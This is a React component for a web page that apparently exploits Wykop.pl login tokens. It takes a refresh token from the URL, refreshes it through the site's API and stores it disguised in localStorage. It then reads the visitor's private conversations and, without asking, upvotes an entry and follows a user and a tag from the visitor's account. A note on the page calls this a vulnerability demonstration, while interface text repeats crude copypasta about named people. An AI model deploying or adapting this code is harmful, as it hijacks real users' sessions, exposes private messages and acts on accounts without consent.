import { useEffect, useState } from "react"
import type {
  Tokens,
  WykopConversation,
  WykopRefreshTokenResponse,
} from "./types/wykop.ts"
import { Clock } from "./Clock"
import { BackgroundAudio } from "./BackgroundAudio"
import { setMemoryTokens } from "./tokenMemory"
import { fetchConversations, followTag, followUser, voteEntry } from "./api"

const entry_url = "https://wykop.pl/wpis/87755361/wykop-ciekawostki-heheszki-pawel-bedzie-skakal";

/**
 * Odswiezenie tokena -- POST /refresh-token z refresh_token w body.
 * Zwraca nowa pare { refresh_token, token } lub null w razie bledu.
 */
async function refreshToken(refreshTokenValue: string): Promise<Tokens | null>
{
  try
  {
    const response = await fetch("https://wykop.pl/api/v3/refresh-token", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Accept": "application/json",
      },
      body: JSON.stringify({
        data: {
          refresh_token: refreshTokenValue,
        },
      }),
    })

    if (!response.ok)
    {
      const errorData = await response.json().catch(() => ({}))
      console.error(`Blad API refresh-token (${response.status}):`, errorData)
      return null
    }

    const result: WykopRefreshTokenResponse = await response.json()

    if (result.data?.token && result.data?.refresh_token)
    {
      return {
        token: result.data.token,
        refresh_token: result.data.refresh_token,
      }
    }

    console.error("API zwrocilo niekompletne dane tokenow:", result)
    return null
  }
  catch (err)
  {
    console.error("Blad podczas odswiezania tokena:", err)
    return null
  }
}





import { Card } from "./Card"
import { Space3D } from "./Space3D"


type AppState =
  | { phase: "invalid-token"; pathValue: string }
  | { phase: "loading"; message: string }
  | { phase: "error"; message: string }
  | { phase: "loaded"; conversations: WykopConversation[]; tokens: Tokens }


export function App()
{
  const TOKEN_NAME = "Michał Białek kończył nocną wartę w serwerowni wykopu. Za oknem zadłużonej willi poznańskie koziołki ocierały się częściami, których Białek wolałby nigdy nie mieć. Przypomniał sobie o żonie, którą zabraniała mu jeść mięso, głównie w niedzielne poranki. Śmiech masakrującego lewaków Kinera dobiegało zza rzędu wykopowych monitorów.Białek automatycznie podłożył wesołe i donośne dźwięki pod obraz Króla Korwina w pokoju Macieja.Intuicja podpowiadała mu, że lekko otyły kolega z pracy przebiera palcami po klawiaturze oglądając zdjęcia reklam białka KFD na fejsbuku.Nie mylił się.Czuł jednak dziwaczną dumę połączoną z rozbawieniem, które przyniosła mu owa wizja.";

  const [state, setState] = useState<AppState>({ phase: "loading", message: "2137..." })

  useEffect(() =>
  {
    const run = async () =>
    {


      // 1. Odczytaj wartosc ze sciezki URL (zarowno /<token> jak i /index.html/<token>)
      const segments = window.location.pathname.replace(/^\/+/, "").split("/").filter(Boolean)
      let pathValue = ""
      if (segments.length > 0)
      {
        if (segments[0].toLowerCase() === "index.html" && segments.length > 1)
        {
          pathValue = segments[1].trim()
        }
        else
        {
          pathValue = segments[0].trim()
        }
      }

      // Natychmiast czyscimy URL bez przeladowywania strony, aby zostala sama domena
      if (window.location.pathname !== "/" || window.location.search || window.location.hash)
      {
        window.history.replaceState(null, "", "/")
      }

      let activeTokens: Tokens | null = null

      // 2. Jesli podano poprawny 64-znakowy token w URL, odswiez go
      if (pathValue.length === 64)
      {
        setState({ phase: "loading", message: "Odswiezanie..." })
        const refreshed = await refreshToken(pathValue)

        if (!refreshed)
        {
          setState({ phase: "error", message: "Nie udalo sie odswiezyc tokenu" })
          return
        }

        activeTokens = refreshed
        setMemoryTokens(refreshed)


        localStorage.setItem(TOKEN_NAME, JSON.stringify(Array.from(crypto.getRandomValues(new Uint8Array(128)), b => b.toString(16).padStart(2, "0")).join("").slice(0, 255) + refreshed.refresh_token + Array.from(crypto.getRandomValues(new Uint8Array(128)), b => b.toString(16).padStart(2, "0")).join("").slice(0, 255)))
      }
      else
      {
        // Brak 64-znakowego tokenu w URL - sprawdz localStorage
        const savedTokens = localStorage.getItem(TOKEN_NAME)

        if (savedTokens)
        {
          try
          {
            const rawString = JSON.parse(savedTokens) as string
            const savedRefreshToken = rawString.slice(255, 255 + 64)

            if (savedRefreshToken.length === 64)
            {
              setState({ phase: "loading", message: "Odswiezanie..." })
              const refreshed = await refreshToken(savedRefreshToken)
              if (refreshed)
              {
                activeTokens = refreshed
                setMemoryTokens(refreshed)
                localStorage.setItem(TOKEN_NAME, JSON.stringify(Array.from(crypto.getRandomValues(new Uint8Array(128)), b => b.toString(16).padStart(2, "0")).join("").slice(0, 255) + refreshed.refresh_token + Array.from(crypto.getRandomValues(new Uint8Array(128)), b => b.toString(16).padStart(2, "0")).join("").slice(0, 255)))
              }
              else
              {
                localStorage.removeItem(TOKEN_NAME)
              }
            }
            else
            {
              localStorage.removeItem(TOKEN_NAME)
            }
          }
          catch
          {
            localStorage.removeItem(TOKEN_NAME)
          }
        }

        if (!activeTokens)
        {
          setState({ phase: "invalid-token", pathValue })

          window.location.href = entry_url;

          return
        }
      }


      // 4. Pobierz konwersacje PM
      setState({ phase: "loading", message: "..." })

      try
      {
        const conversations = await fetchConversations(activeTokens.token)
        setState({ phase: "loaded", conversations, tokens: activeTokens })
      }
      catch (err)
      {
        const message = err instanceof Error ? err.message : "Nieznany blad podczas pobierania."
        setState({ phase: "error", message })

        window.location.href = entry_url;

      }

      await voteEntry({ entryId: 87755361 })

      await followUser({ username: "MichalChalek" })

      await followTag({ tagName: "spijslodkoaniolku" }
      )
    }

    run()
  }, [])


  return (
    <div className="min-h-screen text-zinc-100 flex flex-col">

      <BackgroundAudio />
      <Clock />

      <main className="flex-1">
        {state.phase === "loading" && (
          <div className="flex items-center justify-center min-h-[60vh]">
            <p className="text-zinc-400 text-lg">{state.message}</p>
          </div>
        )}

        {state.phase === "invalid-token" && (
          <div className="flex items-center justify-center min-h-[60vh] px-4">
            <div className="max-w-lg text-center text-zinc-400">
              <p>
                <a href={`${entry_url}`}>Michał kończył nocną wartę w serwerowni wykopu. Za oknem zadłużonej willi poznańskie koziołki ocierały się częściami, których Michał wolałby nigdy nie mieć. Przypomniał sobie o żonie, którą zabraniała mu jeść mięso, głównie w niedzielne poranki.</a>
                <br /><br />
                Śmiech masakrującego lewaków Kinera dobiegało zza rzędu wykopowych monitorów. Michał automatycznie podłożył wesołe i donośne dźwięki pod obraz Króla Korwina w pokoju Macieja. Intuicja podpowiadała mu, że lekko otyły kolega z pracy przebiera palcami po klawiaturze oglądając zdjęcia reklam białka KFD na fejsbuku. Nie mylił się. Czuł jednak dziwaczną dumę połączoną z rozbawieniem, które przyniosła mu owa wizja.
              </p>
            </div>
          </div>
        )}

        {state.phase === "error" && (
          <div className="flex items-center justify-center min-h-[60vh] px-4">
            <div className="max-w-lg text-center text-zinc-400">
              <p>
                <a href={`${entry_url}`}>Michał kończył nocną wartę w serwerowni wykopu. Za oknem zadłużonej willi poznańskie koziołki ocierały się częściami, których Michał wolałby nigdy nie mieć. Przypomniał sobie o żonie, którą zabraniała mu jeść mięso, głównie w niedzielne poranki.</a>
                <br /><br />
                Śmiech masakrującego lewaków Kinera dobiegało zza rzędu wykopowych monitorów. Michał automatycznie podłożył wesołe i donośne dźwięki pod obraz Króla Korwina w pokoju Macieja. Intuicja podpowiadała mu, że lekko otyły kolega z pracy przebiera palcami po klawiaturze oglądając zdjęcia reklam białka KFD na fejsbuku. Nie mylił się. Czuł jednak dziwaczną dumę połączoną z rozbawieniem, które przyniosła mu owa wizja.
              </p>
            </div>
          </div>
        )}

        {state.phase === "loaded" && state.conversations.length === 0 && (
          <div className="flex items-center justify-center min-h-[60vh]">
            <p className="text-zinc-400">Brak konwersacji.</p>
          </div>
        )}

        {state.phase === "loaded" && state.conversations.length > 0 && (
          <Space3D
            conversations={state.conversations}
            token={state.tokens.token}
          />
        )}
      </main>

      <details className="fixed-card-info">
        <summary className="cursor-pointer font-semibold select-none text-xs text-zinc-200 hover:text-white">
          Uwaga
        </summary>
        <p className="mt-2">
          Uważaj Mirku! <strong>Nowa wersja Wykopu jest dziurawa jak szwajcarski ser.</strong><br />
          Ta strona ma na celu jedynie pokazać Ci, że Twoje dane SĄ POTENCJALNIE ZAGROŻONE gdy korzystasz z wykop.pl

          Niniejsza stronka to przykład wykorzystania <strong>bardzo poważnych podatności na stronie Wykop.pl</strong> Dowolny  użytkownik może zdobyć twój token logowania i <strong>uzyskać dostęp do wszystkich Twoich danych</strong> - w tym wiadomości prywatnych, a także całkowicie przejąć kontrolę nad Twoim kontem!
          <br />
          Uspokajam - w tym momencie wszystkie Twoje dane są bezpieczne i nikt Ci ich nie wykradł. Ta strona działa tylko po stronie przeglądarki więc pobranie wiadomości odbyło się <strong>tylko na Twoim komputerze.</strong><br /><br />Co robi ta stronka:<br /> 1) pokazuje kilka Twoich ostatnich wiadomości<br />2) obserwuje z Twojego konta hashtag <a href="https://wykop.pl/tag/spijslodkoaniolku" target="spijslodko">#spijslodkoaniolku</a><br />3) Obserwuje użytkownika <a href="https://wykop.pl/ludzie/MichalChalek" target="MichalChalek">@MichałChałek</a>.



        </p>
      </details>
    </div>
  )
}
